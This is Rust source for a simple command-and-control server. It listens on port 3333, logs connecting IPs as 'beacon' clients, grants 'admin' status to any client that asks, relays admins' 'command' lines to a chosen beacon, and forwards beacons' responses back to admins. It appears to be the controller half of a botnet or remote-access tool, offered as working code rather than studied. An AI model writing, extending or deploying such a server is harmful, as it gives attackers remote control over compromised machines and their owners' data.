use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::fs::File;
use std::fs::OpenOptions;
use std::str;
use std::io::BufReader;
//static mut ADMIN:Vec<String>=Vec::new();
static  mut ONLINE:Vec<((String,String),TcpStream)>=Vec::new();
fn is_zero(buf: &[u8]) -> bool {
    buf.into_iter().all(|&b| b == 0)
}

unsafe fn orders_manage(commands:Vec<&str>, mut stream:TcpStream){
   //let mut ONLINE =HASHMAP.lock().expect("unable to lock mutex");
    if commands[0]=="admin"{
        println!("ici");
        let mut i=0;
        for key in ONLINE.iter() {

            if key.1.peer_addr().unwrap() == stream.peer_addr().unwrap()
            {
                //key.0.1="admin".to_string();
                ONLINE[i].0.1="admin".to_string();
                stream.write(b"Admin Authentified\n").unwrap();
            }
            i=i+1;
        }
    }
    else if commands[0]=="response" {
        let comm:String =   commands.into_iter().map(|i| i.to_string()+" ").collect::<String>();
        for key in ONLINE.iter() {
            if key.0.1 == "admin" {
                let mut target_stream: TcpStream = key.1.try_clone().unwrap();
                target_stream.write(comm.as_bytes()).unwrap();
                target_stream.write(b"\n").unwrap();
            }
        }
    }
    else if commands[0]=="command"{
        commands[1].replace("target", " ");
        println!("{}",commands[1]);
        let comm =commands[0].to_owned()+" "+commands[1];
        let target = commands[2];
        println!("{} {}",comm,target);
        for key in ONLINE.iter() {
            if key.0.0==target && key.0.1=="beacon"{
                let mut target_stream:TcpStream=key.1.try_clone().unwrap();
                target_stream.write(comm.as_bytes()).unwrap();
                target_stream.write(b"\n").unwrap();

            }
        }
    } else if commands[0]=="exit"{
        let test:String=stream.peer_addr().unwrap().to_string();
        let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
        for i in 0..ONLINE.len(){
            if   ONLINE[i].0.0==client_ip{
                ONLINE.remove(i);
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
        }
    } else if commands[0]=="list"
    {
        for key in ONLINE.iter(){
            stream.write(key.0.0.as_bytes()).unwrap();
            stream.write(key.0.1.as_bytes()).unwrap();
            stream.write(b"\n").unwrap();
        }
    }
}
fn trim_newline(s: &mut String) {
    s.pop();
    if s.ends_with('\n') {
        s.pop();
        if s.ends_with('\r') {
            s.pop();
        }
    }
}
fn to_clean_string(buffer: &mut [u8]) -> String {
    let mut vec_input = vec![];
    vec_input.extend_from_slice(&buffer);
    let mut input = String::from_utf8(vec_input).unwrap();
    input.retain(|c| c != '\0');
    input.retain(|c| c!='\r');
    trim_newline(&mut input);
    let tmp:&str=input.split("\n").collect::<Vec<&str>>()[0];
    return  tmp.to_string();
}

fn register(stream: &str){
    println!("registering");
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("src/user.txt")
        .unwrap();
    writeln!(file,"{}",stream).expect("Unable to write file");
}

  fn handle_client(mut stream: TcpStream) {
    //let mut data = [0u8; 1024]; // using 50 byte buffer*
      let test:String=stream.peer_addr().unwrap().to_string();
      let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
      let mut data =[0u8;1024];
      //for _ in 0..128 { data.push(0); }
      //let mut data = Vec::with_capacity(50);
      while match stream.read(&mut data) {
        Ok(size) => unsafe {
            if !is_zero(&data){
                let tmp=to_clean_string(&mut data);
                let orders:Vec<&str>=tmp.split(":").collect();
                //println!("{:?}",orders);
                orders_manage(orders,stream.try_clone().unwrap());
            } else {
                for i in 0..ONLINE.len() {
                    if   ONLINE[i].0.0==client_ip{
                        println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
                        ONLINE.remove(i);
                        stream.shutdown(Shutdown::Both).expect("shutdown call failed");
                    }
                }

            }

            true
        },
        Err(_) => {
            println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
            stream.shutdown(Shutdown::Both).unwrap();
            false
        }
    }{}

 }

fn main() {
    let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
    // accept connections and process them, spawning a new thread for each one
    println!("Server listening on port 3333");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => unsafe {
                println!("New connection: {}", stream.peer_addr().unwrap());
                let test:String=stream.peer_addr().unwrap().to_string();
                let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
                let file: File = File::open("src/user.txt").expect("error");
                let mut _buf_reader = BufReader::new(file);
                let mut contents = String::new();
                _buf_reader.read_to_string(&mut contents).unwrap();
                let _vec = contents.split("\n").collect::<Vec<&str>>();
                let mut ok:bool=false;
                for ip in _vec.iter(){
                    let _ip:Vec<&str>=ip.split(":").collect();
                    if  client_ip==_ip[0]
                    {
                        ok=true;
                    }
                }
                if ok==false{register(client_ip.clone())};
                //let mut ONLINE =HASHMAP.lock().expect(" Unable to find stream");

                ONLINE.push(((client_ip.to_string(),"beacon".to_string()),stream.try_clone().expect(" Unable to clone stream")));
                thread::spawn(move|| {
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
    // close the socket server
    drop(listener);
}